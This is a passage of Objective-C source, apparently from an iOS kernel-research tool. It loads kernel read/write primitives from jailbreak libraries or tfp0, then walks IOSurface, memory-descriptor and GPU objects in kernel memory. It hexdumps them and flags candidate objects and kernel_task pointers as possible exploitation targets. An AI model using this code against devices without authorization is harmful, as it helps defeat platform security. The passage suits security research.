        fkt_krw_initializer_t init = (fkt_krw_initializer_t)dlsym(h, "krw_initializer");
        [self log:@"krw_initializer=%p", init];
        if (!init) continue;
        fkt_krw_handlers_t handlers; memset(&handlers, 0, sizeof(handlers)); handlers.version = 0;
        int ir = init(&handlers);
        [self log:@"krw_initializer rv=%d kread=%p kbase=%p", ir, handlers.kread, handlers.kbase];
        if (ir != 0 || !handlers.kread || !handlers.kbase) continue;
        _lib_kread = handlers.kread; _lib_kwrite = handlers.kwrite; _lib_kbase = handlers.kbase; _lib_physread = handlers.physread;
        if ([self probeHandlersLabeled:@"direct-dopamine"]) { _backend = [NSString stringWithFormat:@"dopamine-plugin:%s", plugins[i]]; return YES; }
        _lib_kread = NULL; _lib_kwrite = NULL; _lib_kbase = NULL; _lib_physread = NULL;
    }
    return NO;
}

- (BOOL)tryLibkrw {
    if (![self ensureRoot]) [self log:@"tryLibkrw: still not root — libkrw probe may fail"];
    (void)[self callJbclientInitPrimitives];
    typedef char *(*jbroot_t)(const char *); jbroot_t jbroot = NULL;
    void *libroot = dlopen("/var/jb/usr/lib/libroot.dylib", RTLD_LAZY);
    if (!libroot) libroot = dlopen("/usr/lib/libroot.dylib", RTLD_LAZY);
    if (libroot) jbroot = (jbroot_t)dlsym(libroot, "jbroot");
    NSMutableArray<NSString *> *tries = [NSMutableArray array];
    void (^add)(NSString *) = ^(NSString *p) { if (p.length && ![tries containsObject:p]) [tries addObject:p]; };
    add(@"/var/jb/usr/lib/libkrw.0.dylib"); add(@"/var/jb/usr/lib/libkrw.dylib"); add(@"/usr/lib/libkrw.0.dylib"); add(@"/usr/lib/libkrw.dylib");
    if (jbroot) { const char *a = jbroot("/usr/lib/libkrw.0.dylib"); const char *b = jbroot("/usr/lib/libkrw.dylib"); if (a) add(@(a)); if (b) add(@(b)); }
    NSArray *plugDirs = @[@"/var/jb/usr/lib/libkrw", @"/usr/lib/libkrw"];
    if (jbroot) { const char *pd = jbroot("/usr/lib/libkrw"); if (pd) plugDirs = [plugDirs arrayByAddingObject:@(pd)]; }
    for (NSString *dir in plugDirs) {
        NSArray *ents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:nil];
        for (NSString *e in ents) {
            if (![e hasSuffix:@".dylib"]) continue;
            NSString *full = [dir stringByAppendingPathComponent:e];
            void *ph = dlopen(full.fileSystemRepresentation, RTLD_LOCAL | RTLD_LAZY);
            [self log:@"plugin try %s → %p err=%s", full.UTF8String, ph, ph ? "(ok)" : (dlerror() ?: "?")];
        }
    }
    for (NSString *path in tries) {
        dlerror(); void *h = dlopen(path.fileSystemRepresentation, RTLD_NOW); const char *err = dlerror();
        [self log:@"dlopen %s → %p err=%s", path.UTF8String, h, h ? "(ok)" : (err ?: "?")];
        if (!h) continue;
        _lib_kread = (krw_kread_t)dlsym(h, "kread");
        _lib_kwrite = (krw_kwrite_t)dlsym(h, "kwrite");
        _lib_kbase = (krw_kbase_t)dlsym(h, "kbase");
        _lib_physread = (krw_physread_t)dlsym(h, "physread");
        [self log:@"syms kread=%p kwrite=%p kbase=%p physread=%p", _lib_kread, _lib_kwrite, _lib_kbase, _lib_physread];
        if (!_lib_kread) continue;
        if (![self probeHandlersLabeled:path]) {
            [self log:@"kbase/kread probe FAIL on %@", path];
            [self log:@"  arch mismatch? Procursus libkrw.0 is often arm64-only."];
            [self log:@"  Is Dopamine currently jailbroken?"];
            _lib_kread = NULL; _lib_kwrite = NULL; _lib_kbase = NULL; _lib_physread = NULL; continue;
        }
        _backend = [NSString stringWithFormat:@"libkrw:%@", path]; return YES;
    }
    return NO;
}

- (BOOL)tryTfp0 {
    mach_port_t p = MACH_PORT_NULL;
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &p);
    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(p)) kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &p);
    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(p)) return NO;
    _tfp0 = p; _backend = @"tfp0";
    mach_vm_address_t addr = 0; mach_vm_size_t size = 0;
    vm_region_basic_info_data_64_t info; mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64; mach_port_t obj = MACH_PORT_NULL;
    kr = mach_vm_region(_tfp0, &addr, &size, VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &count, &obj);
    if (kr == KERN_SUCCESS) _kbase = addr;
    return YES;
}

- (BOOL)openKRW {
    if (_lib_kread || MACH_PORT_VALID(_tfp0)) return YES;
    if ([self tryDopaminePluginDirect]) return YES;
    if ([self tryLibkrw]) return YES;
    if ([self tryTfp0]) return YES;
    _backend = @"none"; return NO;
}

- (BOOL)kread:(uint64_t)addr into:(void *)buf size:(size_t)size {
    if (!buf || size == 0) return NO; memset(buf, 0, size);
    if (_lib_kread) return _lib_kread(addr, buf, size) == 0;
    if (!MACH_PORT_VALID(_tfp0)) return NO;
    mach_vm_size_t outn = 0;
    kern_return_t kr = mach_vm_read_overwrite(_tfp0, addr, size, (mach_vm_address_t)buf, &outn);
    return kr == KERN_SUCCESS && outn == size;
}

- (uint64_t)kread64:(uint64_t)addr { uint64_t v = 0; [self kread:addr into:&v size:8]; return v; }
- (uint32_t)kread32:(uint64_t)addr { uint32_t v = 0; [self kread:addr into:&v size:4]; return v; }
- (uint16_t)kread16:(uint64_t)addr { uint16_t v = 0; [self kread:addr into:&v size:2]; return v; }

// MARK: - KWrite Wrappers
- (BOOL)kwrite:(uint64_t)addr from:(void *)buf size:(size_t)size {
    if (!buf || size == 0) return NO;
    if (_lib_kwrite) {
        // libkrw ABI: kwrite(void *from, uint64_t to, size_t len)
        return _lib_kwrite(buf, addr, size) == 0;
    }
    return NO;
}

- (BOOL)kwrite32:(uint64_t)addr val:(uint32_t)val {
    return [self kwrite:addr from:&val size:sizeof(val)];
}

- (BOOL)kwrite64:(uint64_t)addr val:(uint64_t)val {
    return [self kwrite:addr from:&val size:sizeof(val)];
}

- (uint64_t)live:(uint64_t)unslid { return unslid + _slide; }

- (void)hexdump:(uint64_t)addr size:(size_t)size {
    size = MIN(size, (size_t)0x100); uint8_t *buf = calloc(1, size);
    if (!buf) return; BOOL ok = [self kread:addr into:buf size:size];
    [self log:@"--- hexdump kva=0x%llx n=0x%zx ok=%d ---", addr, size, ok];
    if (ok) {
        for (size_t i = 0; i < size; i += 16) {
            char line[128]; int n = snprintf(line, sizeof(line), "0x%016llx:", addr + i);
            for (size_t j = 0; j < 16 && i + j < size; j++) n += snprintf(line + n, sizeof(line) - (size_t)n, " %02x", buf[i + j]);
            [self log:@"%s", line];
        }
    }
    free(buf);
}

- (NSString *)kstring:(uint64_t)addr max:(size_t)max {
    if (!addr) return @"(null)";
    char buf[128]; size_t n = MIN(max, sizeof(buf) - 1);
    if (![self kread:addr into:buf size:n]) return @"(kread fail)";
    buf[n] = 0;
    for (size_t i = 0; i < n; i++) { if (buf[i] == 0) break; if ((unsigned char)buf[i] < 0x20 || (unsigned char)buf[i] > 0x7e) buf[i] = '.'; }
    return [NSString stringWithUTF8String:buf] ?: @"(bin)";
}

- (void)dumpClassString:(const char *)tag unslid:(uint64_t)unslid {
    uint64_t live = [self live:unslid]; NSString *s = [self kstring:live max:80];
    [self log:@"[STR] %s unslid=0x%llx live=0x%llx \"%@\"", tag, unslid, live, s];
    [self scanPtrsTo:live name:tag inUnslid:FKT_DC_UNSLID size:FKT_DC_SIZE];
    [self scanPtrsTo:live name:tag inUnslid:FKT_DATA_UNSLID size:FKT_DATA_SIZE];
}

- (void)stashMD:(uint64_t)md {
    if (!is_kva(md) || _n_live_mds >= 32) return;
    for (int i = 0; i < _n_live_mds; i++) { if (_live_mds[i] == md) return; }
    _live_mds[_n_live_mds++] = md;
    uint64_t vt = [self jkread_ptr:md]; if (!_gmd_vtable && is_kva(vt)) _gmd_vtable = vt;
}

- (void)stashSurface:(uint64_t)surf {
    if (!is_kva(surf) || _n_iosurface_kvas >= 16) return;
    for (int i = 0; i < _n_iosurface_kvas; i++) { if (_iosurface_kvas[i] == surf) return; }
    _iosurface_kvas[_n_iosurface_kvas++] = surf;
}

- (NSString *)classNameFromVtable:(uint64_t)vt {
    if (!is_kva(vt)) return @"(no vt)";
    uint64_t uvt = fkt_vt_unslid(vt, _slide);
    static const int vt_off[] = { -8, -16, 8, 0 };
    static const int name_off[] = { 0x10, 0x18, 0x08, 0x20, 0x28 };
    for (int i = 0; i < 4; i++) {
        uint64_t mc = fkt_canon_kva([self jkread_ptr:vt + (uint64_t)(int64_t)vt_off[i]]);
        if (!is_kva(mc)) continue;
        uint32_t inst = [self jkread32:mc + 0x20];
        if (inst != 0xb0 && inst != 0x60) inst = [self jkread32:mc + 0x24];
        if (inst != 0xb0 && inst != 0x60 && inst != 0x80) continue;
        for (int j = 0; j < 5; j++) {
            uint64_t np = [self jkread_ptr:mc + name_off[j]]; if (!np) continue;
            NSString *s = [self kstring:fkt_canon_kva(np) max:64];
            if (s.length >= 3) return [NSString stringWithFormat:@"%@ inst=0x%x vt_unslid=0x%llx", s, inst, uvt];
        }
    }
    return [NSString stringWithFormat:@"(class unresolved vt_unslid=0x%llx)", uvt];
}

- (void)annotateTaskSlots:(uint64_t)obj bytes:(uint32_t)n tag:(const char *)tag {
    if (!is_kva(obj) || n < 8) return; int hits = 0;
    for (uint32_t off = 0x10; off + 8 <= n; off += 8) {
        uint64_t p = [self jkread_ptr:obj + off]; p = unsign_kptr(p);
        if (_kernel_task && p == _kernel_task) { [self log:@"  %s +0x%x = kernel_task", tag, off]; hits++; }
        else if (_self_task && p == _self_task) { [self log:@"  %s +0x%x = our task", tag, off]; hits++; }
    }
    if (!hits) [self log:@"  %s: no qword matches kernel_task or our task (in +0x10..+0x%x)", tag, n];
}

- (void)dumpMD:(uint64_t)md label:(const char *)label {
    [self log:@"--- MD %s kva=0x%llx ---", label, md];
    if (!is_kva(md)) { [self log:@"  not a kernel VA — skip"]; return; }
    [self stashMD:md]; [self hexdump:md size:0xb0];
    uint64_t vt = [self jkread_ptr:md]; uint32_t flags = [self jkread32:md + 0x20];
    uint64_t mem20 = [self jkread_ptr:md + 0x20]; uint64_t size = [self jkread64:md + 0x50];
    uint64_t ranges = [self jkread_ptr:md + 0x60];
    [self log:@"  class %@", [self classNameFromVtable:vt]];
    [self log:@"  vt=0x%llx (%s) +0x20 flags=0x%x memobj?=%s 0x%llx", vt, va_class(vt), flags, va_class(mem20), mem20];
    [self log:@"  getLength field +0x50=0x%llx  ranges=+0x60 → 0x%llx (%s)", size, ranges, va_class(ranges)];
    [self log:@"  +0x18=0x%llx +0x28=0x%llx +0x70=0x%llx +0x88=0x%x +0x90=0x%llx", [self jkread64:md + 0x18], [self jkread64:md + 0x28], [self jkread64:md + 0x70], [self jkread32:md + 0x88], [self jkread64:md + 0x90]];
    [self annotateTaskSlots:md bytes:0xb0 tag:"MD task"];
    if (is_kva(vt)) {
        [self log:@"  vt slots +0xb0..+0xe8 (getLength/writeBytes/prepare/complete):"];
        for (uint32_t off = 0xb0; off <= 0xe8; off += 8) {
            uint64_t slot = [self jkread_ptr:vt + off]; const char *hint = "";
            if (off == 0xb0) hint = "  ; getLength/getSize";
            else if (off == 0xc8) hint = "  ; writeBytes-ish";
            else if (off == 0xd0) hint = "  ; readBytes-ish";
            else if (off == 0xd8) hint = "  ; prepare";
            else if (off == 0xe0) hint = "  ; complete";
            [self log:@"    vt+0x%x = 0x%llx%s", off, slot, hint];
        }
    }
    if (is_kva(ranges) && !is_ktextish(ranges) && unsign_kptr(ranges) != unsign_kptr(vt)) {
        uint64_t a0 = [self jkread64:ranges]; uint64_t s0 = [self jkread64:ranges + 8];
        const char *cls = va_class(a0);
        [self log:@"  ranges[0] addr=0x%llx (%s) len=0x%llx", a0, cls, s0];
        int tk = [self taskKind:[self jkread_ptr:md + 0x70]];
        if (is_shape1_object(a0, s0, flags, tk)) { _ans_shape1_hits++; [self log:@"  *** SHAPE-1 CANDIDATE: kalloc/IOKit object body (not GPU window / not 0x11b) ***"]; }
        else if (strcmp(cls, "KERN") == 0) { [self log:@"  KERN_WIN (GPU/IOMMU/page map or 0x11b kernel_task) — not Shape-1"]; }
        else if (strcmp(cls, "USER?") == 0) { [self log:@"  control sample (USER WAR) — expected for IOSurfaceCreate; NOT Shape-1"]; }
        [self hexdump:ranges size:0x40];
    } else if (is_kva(ranges)) { [self log:@"  ranges=0x%llx ignored (vt/TEXT lookalike — not Shape-1)", ranges]; }
}

- (uint64_t)surfaceFromPort:(mach_port_t)port inTask:(uint64_t)task {
    if (!_jb_port_kobject || !MACH_PORT_VALID(port) || !task) return 0;
    uint64_t raw = _jb_port_kobject(task, port); uint64_t kobj = unsign_kptr(raw);
    [self log:@"  port=0x%x task=0x%llx kobject raw=0x%llx unsign=0x%llx", port, task, raw, kobj];
    if (!is_kva(kobj)) return 0;
    uint64_t candidates[8]; int nc = 0; candidates[nc++] = kobj;
    uint64_t o30 = [self jkread_ptr:kobj + 0x30]; uint64_t o18 = [self jkread_ptr:kobj + 0x18]; uint64_t o40 = [self jkread_ptr:kobj + 0x40];
    [self log:@"  kobj+0x18=0x%llx +0x30=0x%llx +0x40=0x%llx", o18, o30, o40];
    if (is_kva(o30)) { candidates[nc++] = o30; uint64_t s18 = [self jkread_ptr:o30 + 0x18]; if (is_kva(s18)) candidates[nc++] = s18; uint64_t s40 = [self jkread_ptr:o30 + 0x40]; if (is_kva(s40)) candidates[nc++] = s40; }
    if (is_kva(o18)) candidates[nc++] = o18;
    if (is_kva(o40)) candidates[nc++] = o40;
    for (int i = 0; i < nc; i++) {
        uint64_t surf = candidates[i];
        for (uint32_t off = 0x30; off <= 0x40; off += 8) {
            uint64_t md = [self jkread_ptr:surf + off]; if (!is_kva(md)) continue;
            uint64_t vt = [self jkread_ptr:md]; uint64_t ranges = [self jkread_ptr:md + 0x60];
            if (is_kva(vt)) { [self log:@"  candidate surf=0x%llx MD via +0x%x → 0x%llx (accept)", surf, off, md]; _iosurface_md_off = off; _ans_iosurface_md_slot = off; return surf; }
            (void)ranges;
        }
    }
    [self log:@"  no MD heuristic hit — returning kobj for hexdump"];
    return kobj;
}

- (uint64_t)surfaceFromPort:(mach_port_t)port { if (!_jb_task_self) return 0; return [self surfaceFromPort:port inTask:_jb_task_self()]; }

- (uint64_t)mdFromSurface:(uint64_t)surface {
    static const uint32_t cands[] = { 0x40, 0x30, 0x38, 0 };
    for (int i = 0; cands[i]; i++) {
        uint64_t md = [self jkread_ptr:surface + cands[i]]; if (!is_kva(md)) continue;
        uint64_t vt = [self jkread_ptr:md]; uint64_t ranges = [self jkread_ptr:md + 0x60];
        if (is_kva(vt)) { [self log:@"  IOSurface+0x%x → MD=0x%llx vt=0x%llx ranges=0x%llx", cands[i], md, vt, ranges]; _iosurface_md_off = cands[i]; _ans_iosurface_md_slot = cands[i]; return md; }
    }
    [self log:@"  no MD at +0x30/+0x38/+0x40"]; return 0;
}

- (void)consumeSandboxExtensions {
    if (!_jb) return;
    typedef int (*checkin_t)(char **, char **, char **, bool *, bool *);
    checkin_t checkin = (checkin_t)dlsym(_jb, "jbclient_process_checkin");
    typedef int64_t (*consume_t)(const char *); consume_t consume = (consume_t)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!checkin) { [self log:@"jbclient_process_checkin missing"]; return; }
    char *root = NULL, *uuid = NULL, *ext = NULL; bool dbg = false, adhoc = false;
    int rv = checkin(&root, &uuid, &ext, &dbg, &adhoc);
    [self log:@"jbclient_process_checkin rv=%d ext=%s", rv, ext ? "yes" : "no"];
    if (rv == 0 && ext && consume) {
        char *dup = strdup(ext); char *p = dup;
        while (p && *p) { char *bar = strchr(p, '|'); if (bar) *bar = 0; int64_t h = consume(p); [self log:@"  sandbox_extension_consume → %lld", (long long)h]; if (!bar) break; p = bar + 1; }
        free(dup);
    }
    free(root); free(uuid); free(ext);
}

- (NSArray<NSNumber *> *)loadMintedSurfaceIds {
    NSString *body = [NSString stringWithContentsOfFile:FKTSurfaceIdsPath() encoding:NSUTF8StringEncoding error:nil];
    if (!body.length) return @[];
    NSMutableArray *out = [NSMutableArray array];
    for (NSString *line in [body componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]) {
        NSString *t = [line stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]]; if (!t.length) continue;
        [out addObject:@((uint32_t)t.intValue)];
    }
    return out;
}

- (void)walkSurfaceKva:(uint64_t)surface label:(const char *)label {
    if (!is_kva(surface)) return; [self stashSurface:surface];
    [self log:@"-- walk %s kva=0x%llx --", label, surface]; [self hexdump:surface size:0xc0];
    uint64_t md = [self mdFromSurface:surface];
    if (md) { [self dumpMD:md label:label]; return; }
    for (uint32_t off = 0x20; off <= 0x50; off += 8) {
        uint64_t p = [self jkread_ptr:surface + off]; if (!is_kva(p)) continue;
        uint64_t vt = [self jkread_ptr:p]; uint64_t ranges = [self jkread_ptr:p + 0x60]; uint64_t sz = [self jkread64:p + 0x50];
        if (!is_kva(vt)) continue;
        [self log:@"  brute +0x%x → 0x%llx vt=0x%llx size=0x%llx ranges=0x%llx", off, p, vt, sz, ranges];
        if (sz > 0 && sz < 0x10000000ULL) { _ans_iosurface_md_slot = off; char lab[64]; snprintf(lab, sizeof(lab), "%s_brute_0x%x", label, off); [self dumpMD:p label:lab]; return; }
    }
}

- (void)dumpIOSurfaceUserspace {
    [self log:@"=== PHASE2 IOSurface via APP TASK ports (Lookup is cross-proc dead) ==="];
    [self consumeSandboxExtensions];
    NSString *hand = [NSString stringWithContentsOfFile:FKTHandoffPath() encoding:NSUTF8StringEncoding error:nil];
    [self log:@"handoff %lu bytes from %@", (unsigned long)hand.length, FKTHandoffPath()];
    pid_t appPid = 0; NSMutableArray<NSNumber *> *ports = [NSMutableArray array]; NSMutableArray<NSNumber *> *sids = [NSMutableArray array];
    for (NSString *line in [hand componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]) {
        NSArray *p = [line componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        NSMutableArray *tok = [NSMutableArray array]; for (NSString *t in p) if (t.length) [tok addObject:t];
        if (tok.count < 2) continue;
        if ([tok[0] isEqualToString:@"pid"]) appPid = (pid_t)[tok[1] intValue];
        else if ([tok[0] isEqualToString:@"sport"] && tok.count >= 3) { unsigned int mp = 0, sid = 0; sscanf([(NSString *)tok[1] UTF8String], "%x", &mp); sid = (unsigned)[tok[2] intValue]; [ports addObject:@(mp)]; [sids addObject:@(sid)]; }
    }
    [self log:@"appPid=%d sport entries=%lu", appPid, (unsigned long)ports.count];
    int walked = 0; uint64_t appTask = 0;
    if (appPid > 0 && _jb_proc_find && _jb_proc_task) { uint64_t proc = _jb_proc_find(appPid); appTask = proc ? _jb_proc_task(proc) : 0; [self log:@"proc_find(%d)=0x%llx task=0x%llx", appPid, proc, appTask]; }
    if (!appTask) { [self log:@"FAIL: cannot resolve app task — cannot walk sport handoff"]; }
    else {
        for (NSUInteger i = 0; i < ports.count; i++) {
            mach_port_t mp = (mach_port_t)ports[i].unsignedIntValue; uint32_t sid = sids[i].unsignedIntValue;
            char label[40]; snprintf(label, sizeof(label), "appPort_id%u", sid);
            [self log:@"-- resolve %s port=0x%x via app task --", label, mp];
            uint64_t surface = [self surfaceFromPort:mp inTask:appTask];
            if (surface) { [self walkSurfaceKva:surface label:label]; walked++; }
        }
    }
    for (NSNumber *n in [self loadMintedSurfaceIds]) {
        uint32_t sid = n.unsignedIntValue; IOSurfaceRef ref = IOSurfaceLookup(sid); [self log:@"IOSurfaceLookup(%u) → %p", sid, ref];
        if (!ref) continue; char label[32]; snprintf(label, sizeof(label), "Lookup_%u", sid); [self walkSurfaceRef:ref label:label]; CFRelease(ref); walked++;
    }
    IOSurfaceRef a = [KReader makeSurfaceW:120 h:120]; [self log:@"helper Create surfA=%p", a];
    if (a) { [self walkSurfaceRef:a label:"CreateA"]; CFRelease(a); walked++; }
    if (!walked) [self log:@"FAIL: no IOSurface MD walked"];
}

- (void)walkSurfaceRef:(IOSurfaceRef)ref label:(const char *)label {
    if (!ref) return; [self log:@"-- walk %s id=%u --", label, IOSurfaceGetID(ref)];
    if (!_jb_port_kobject || !_jb_task_self) { [self log:@"  STOP: no port_kobject helpers"]; return; }
    mach_port_t mp = IOSurfaceCreateMachPort(ref); uint64_t surface = [self surfaceFromPort:mp];
    if (surface) [self walkSurfaceKva:surface label:label];
    if (MACH_PORT_VALID(mp)) mach_port_deallocate(mach_task_self(), mp);
}

static id fkt_unwrapMetal(id obj) {
    if (!obj) return nil;
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([obj class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL sel = NSSelectorFromString(@"baseObject"); if (![obj respondsToSelector:sel]) break;
        id base = ((id (*)(id, SEL))objc_msgSend)(obj, sel); if (!base || base == obj) break; obj = base;
    }
    return obj;
}

static void *fkt_resourceRef(id obj) {
    obj = fkt_unwrapMetal(obj); SEL sel = NSSelectorFromString(@"resourceRef");
    if (![obj respondsToSelector:sel]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(obj, sel);
}

- (void)ptrTheory:(const char *)th cite:(NSString *)cite live:(uint64_t)live note:(NSString *)note {
    uint64_t u = fkt_canon_kva(live); uint64_t unslid = 0;
    if (_slide && u > _slide && is_ktextish(live)) unslid = u - _slide;
    [self log:@"PTR theory=%s cite=%@ live=0x%llx unslid=0x%llx class=%s note=%@", th, cite, live, unslid, va_class(live), note ?: @""];
}

- (BOOL)looksLikeMD:(uint64_t)p {
    if (!is_kva(p)) return NO; uint64_t vt = [self jkread_ptr:p]; if (!is_ktextish(vt)) return NO;
    uint64_t ranges = [self jkread_ptr:p + 0x60]; uint64_t len = [self jkread64:p + 0x50];
    if (len > 0x400000ULL) return NO;
    if (ranges && !is_kva(ranges) && !is_ktextish(ranges)) return NO;
    return YES;
}

- (void)sysmemAtlas:(uint64_t)obj label:(const char *)label {
    if (!is_kva(obj)) return;
    for (int i = 0; i < _n_sysmems; i++) if (_sysmems[i] == obj) return;
    if (_n_sysmems < 16) _sysmems[_n_sysmems++] = obj;
    [self log:@"=== SYSMEM ATLAS %s kva=0x%llx ===", label, obj];
    [self log:@"  21D50 Ghidra IOGPUSysMemory_create_MD_at_plus80 / getter +0x80 (instSize 0xa8):"];
    [self log:@"    +0x30 length  +0x80 MD*  +0x88 options  +0x90 task/arg"];
    [self log:@"  23F77 twin: +0x30 flags bit4=detached  +0x38 ByteCount  +0x80 zeroed"];
    [self log:@"    +0x88 VA  +0x90 MD* (instSize 0xd8). P007 uses +0x90. Do not paste +0x80."];
    [self hexdump:obj size:0xd0];
    uint32_t flags30 = [self kread32:obj + 0x30]; uint64_t byteCount = [self kread64:obj + 0x38];
    uint8_t pool = (uint8_t)[self kread32:obj + 0x7c];
    uint64_t va88 = [self jkread_ptr:obj + 0x88]; uint64_t md80 = [self jkread_ptr:obj + 0x80]; uint64_t md90 = [self jkread_ptr:obj + 0x90];
    [self log:@"  21D50 +0x30 length/u32=0x%x  +0x38=0x%llx  pool+0x7c bit0=%u  (23F77 would call +0x30 flags)", flags30, byteCount, pool & 1];
    [self log:@"  +0x80=0x%llx (%s MD-shaped=%d)  +0x88=0x%llx (%s)  +0x90=0x%llx (%s MD-shaped=%d)", md80, va_class(md80), [self looksLikeMD:md80], va88, va_class(va88), md90, va_class(md90), [self looksLikeMD:md90]];
    [self ptrTheory:"IOGPUSYSMEM" cite:@"sysmem+0x80" live:md80 note:@"21D50 MD candidate; 23F77 uses +0x90"];
    [self ptrTheory:"IOGPUSYSMEM" cite:@"sysmem+0x88" live:va88 note:@"23F77 VA slot"];
    [self ptrTheory:"IOGPUSYSMEM" cite:@"sysmem+0x90" live:md90 note:@"23F77 MD slot (get_memory_descriptors / replace)"];
    for (uint32_t off = 0; off <= 0xc8; off += 8) {
        uint64_t q = [self jkread_ptr:obj + off]; if (!q) continue; const char *cls = va_class(q); NSString *extra = @"";
        if ([self looksLikeMD:q]) { extra = [NSString stringWithFormat:@" MD class=%@", [self classNameFromVtable:[self jkread_ptr:q]]]; [self ptrTheory:"IOGPUSYSMEM" cite:[NSString stringWithFormat:@"sysmem+0x%x", off] live:q note:extra]; }
        else if (is_ktextish(q)) extra = @" TEXT";
        else if (strcmp(cls, "KERN") == 0) { extra = [NSString stringWithFormat:@" %@", [self classNameFromVtable:[self jkread_ptr:q]]]; [self ptrTheory:"IOGPUSYSMEM" cite:[NSString stringWithFormat:@"sysmem+0x%x", off] live:q note:extra]; }
        if (off == 0x30 || off == 0x38 || off == 0x80 || off == 0x88 || off == 0x90 || off == 0xb0 || off == 0xc8 || extra.length) [self log:@"  SYSMEM +0x%02x 0x%016llx %s%@", off, q, cls, extra];
    }
    if ([self looksLikeMD:md80]) [self printGmdShape:md80 tag:"sysmem+0x80"];
    if ([self looksLikeMD:md90] && md90 != md80) [self printGmdShape:md90 tag:"sysmem+0x90"];
}

- (void)probeSysMemSlots:(uint64_t)obj label:(const char *)label {
    [self log:@"--- SysMemory probe %s kva=0x%llx ---", label, obj];
    if (!is_kva(obj)) return; [self hexdump:obj size:0x100];
    static const uint32_t slots[] = { 0x80, 0x88, 0x90, 0x98, 0xa0, 0x28, 0x30, 0x38, 0x40, 0 };
    for (int i = 0; slots[i]; i++) {
        uint64_t p = [self jkread_ptr:obj + slots[i]]; if (!is_kva(p)) continue;
        uint64_t vt = [self jkread_ptr:p]; uint64_t ranges = [self jkread_ptr:p + 0x60];
        [self log:@"  obj+0x%x → 0x%llx vt=0x%llx ranges=0x%llx (%s)", slots[i], p, vt, ranges, va_class(ranges)];
        if (is_kva(vt) && (is_kva(ranges) || ranges == 0) && !is_ktextish(ranges) && (slots[i] == 0x80 || slots[i] == 0x90 || slots[i] == 0x88)) {
            if (!_ans_sysmem_md_slot || slots[i] == 0x90 || slots[i] == 0x80) _ans_sysmem_md_slot = slots[i];
            char mdlabel[64]; snprintf(mdlabel, sizeof(mdlabel), "%s_MD_at_0x%x", label, slots[i]); [self dumpMD:p label:mdlabel];
        } else if (is_kva(vt) && (is_kva(ranges) || ranges == 0)) { char mdlabel[64]; snprintf(mdlabel, sizeof(mdlabel), "%s_cand_at_0x%x", label, slots[i]); [self dumpMD:p label:mdlabel]; }
    }
}

- (uint64_t)deviceFromConnect:(mach_port_t)conn inTask:(uint64_t)task {
    if (!_jb_port_kobject || !MACH_PORT_VALID(conn) || !task) return 0;
    uint64_t raw = _jb_port_kobject(task, conn); uint64_t kobj = unsign_kptr(raw);
    [self log:@"  conn=0x%x kobject raw=0x%llx unsign=0x%llx", conn, raw, kobj];
    if (!is_kva(kobj)) return 0;
    uint64_t candidates[6]; int nc = 0; candidates[nc++] = kobj;
    uint64_t o120 = [self jkread_ptr:kobj + 0x120]; uint64_t o30 = [self jkread_ptr:kobj + 0x30]; uint64_t o18 = [self jkread_ptr:kobj + 0x18];
    [self log:@"  kobj+0x18=0x%llx +0x30=0x%llx +0x120=0x%llx", o18, o30, o120];
    if (is_kva(o120)) candidates[nc++] = o120;
    if (is_kva(o30)) { candidates[nc++] = o30; uint64_t s120 = [self jkread_ptr:o30 + 0x120]; if (is_kva(s120)) candidates[nc++] = s120; }
    if (is_kva(o18)) candidates[nc++] = o18;
    for (int i = 0; i < nc; i++) {
        uint64_t dev = candidates[i]; uint64_t reg = [self jkread_ptr:dev + 0x10]; if (!is_kva(reg)) continue;
        uint32_t bound = [self kread32:reg + 0x28]; uint64_t arr = [self jkread_ptr:reg + 0x10];
        if (is_kva(arr) && bound > 0 && bound < 0x100000) { [self log:@"  device=0x%llx registry=0x%llx arr=0x%llx bound=%u", dev, reg, arr, bound]; return dev; }
    }
    [self log:@"  no registry-shaped device — hexdumping kobj"]; [self hexdump:kobj size:0x140];
    return is_kva(o120) ? o120 : kobj;
}

- (uint64_t)namespaceArr:(uint64_t)ns boundOut:(uint32_t *)boundOut {
    if (!is_kva(ns)) return 0; uint64_t arr = [self jkread_ptr:ns + 0x10]; uint32_t bound = [self kread32:ns + 0x28];
    if (!is_kva(arr) || bound == 0 || bound > 0x100000u) bound = [self kread32:ns + 0x2c];
    if (!is_kva(arr) || bound == 0 || bound > 0x100000u) return 0;
    if (boundOut) *boundOut = bound; return arr;
}

- (uint64_t)queueFromDevice:(uint64_t)device qid:(uint32_t)qid {
    if (!is_kva(device)) return 0;
    static const uint32_t ns_offs[] = { FKT_QUEUE_NS_OFF, 0x80u, 0x90u, 0 };
    for (int ni = 0; ns_offs[ni]; ni++) {
        uint64_t ns = [self jkread_ptr:device + ns_offs[ni]]; uint32_t bound = 0; uint64_t arr = [self namespaceArr:ns boundOut:&bound];
        if (!arr) continue; [self log:@"  queue-ns device+0x%x ns=0x%llx arr=0x%llx bound=%u qid=%u", ns_offs[ni], ns, arr, bound, qid];
        uint64_t hit = 0;
        if (qid < bound) { uint64_t q = [self jkread_ptr:arr + (uint64_t)qid * 8]; if (is_kva(q)) hit = q; }
        if (!hit && qid) {
            uint32_t lim = bound < 64u ? bound : 64u;
            for (uint32_t i = 0; i < lim; i++) {
                uint64_t q = [self jkread_ptr:arr + (uint64_t)i * 8]; if (!is_kva(q)) continue;
                if ([self jkread32:q + FKT_21D50_QUEUE_QID_OFF] == qid) { hit = q; [self log:@"  matched ns[%u] via queue+0x420 qid", i]; break; }
            }
        }
        uint32_t show = bound < 8u ? bound : 8u;
